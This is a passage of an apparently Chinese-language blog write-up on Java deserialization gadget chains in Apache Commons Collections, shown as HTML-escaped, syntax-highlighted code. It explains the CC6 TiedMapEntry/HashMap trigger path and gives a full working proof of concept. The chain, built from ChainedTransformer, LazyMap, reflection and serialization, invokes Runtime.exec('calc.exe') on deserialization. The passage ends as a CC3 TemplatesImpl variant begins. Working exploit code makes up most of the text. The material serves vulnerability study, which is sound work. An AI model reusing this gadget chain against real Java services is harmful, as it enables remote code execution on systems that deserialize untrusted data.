&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">^&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ..
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在它的&lt;code>getValue&lt;/code>中调用了&lt;code>this.map.get&lt;/code>，而hashCode方法调用了getValue（HashMap的实现原理），在ysoserial中是利用&lt;code>java.util.HashSet#readObject&lt;/code>到&lt;code>HashMap#put()&lt;/code>到&lt;code>HashMap#hash(key)&lt;/code>最后到&lt;code>TiedMapEntry#hashCode()&lt;/code>&lt;/p>
&lt;p>在p牛的简化poc中省略了前两步，通过&lt;code>HashMap#readObject&lt;/code>直接到&lt;code>HashMap#hash(key)&lt;/code>，hash中调用了&lt;code>key.hashCode&lt;/code>（纯HashMap的实现原理&lt;/p>
&lt;p>构造poc，我们只需要让这个key等于TiedMapEntry对象，再改动亿点点&lt;/p>
&lt;p>首先是恶意LazyMap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span> &lt;span style="color:#75715e">// 避免生成payload时触发RCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 得到被装饰后的恶意LazyMap对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 为了调用TiedMapEntry#hashCode 新建HashMap 并把tme作为key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// put也会调用hash(key) 避免对后面get的影响
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 替换真正的transformers
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 序列化部分
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 触发
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>逻辑是比较清晰的，每一部分也都比较好懂&lt;/p>
&lt;h2 id="cc38u71">CC3(&amp;lt;8u71&lt;/h2>
&lt;p>由于&lt;code>TemplatesImpl&lt;/code>可以直接控制字节码（即java代码），所以尝试结合CC1 demo和执行字节码的部分就可以构造出CC3（的一部分）了，需要注意的是要将&lt;code>InvokerTransformer&lt;/code>执行的方法从显式的rce（getRuntime.exec）变为调用&lt;code>TemplatesImpl::newTransformer&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC3mini&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
